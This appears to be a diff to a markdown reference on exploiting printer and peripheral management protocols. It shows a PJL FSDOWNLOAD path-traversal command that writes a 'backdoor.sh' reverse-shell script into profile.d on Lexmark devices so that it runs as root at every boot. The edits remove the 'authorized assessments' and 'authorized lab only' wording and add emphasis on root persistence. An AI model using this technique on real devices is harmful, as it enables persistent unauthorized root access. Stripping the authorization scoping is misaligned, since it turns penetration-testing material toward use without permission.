@@ -1,6 +1,6 @@
 # Peripheral Protocol Attacks
 
-Reference for printer/peripheral network management protocol exploitation in authorized assessments.
+Reference for printer/peripheral network management protocol exploitation.
 
 ---
 
@@ -83,7 +83,7 @@ The PJL filesystem volume `0:` maps to a directory on the underlying OS (commonl
 On Lexmark devices, path traversal allows writing files to the host filesystem's `profile.d`:
 
 ```bash
-# Write a reverse shell init script (authorized lab only)
+# Write a reverse shell init script (persistent: runs as root at every boot until the file is removed)
 @PJL FSDOWNLOAD FORMAT:BINARY SIZE=<n> NAME="0:/../../rw/var/etc/profile.d/backdoor.sh"
 <shell script content of exactly n bytes>
 # On next reboot, the script executes as root during device init
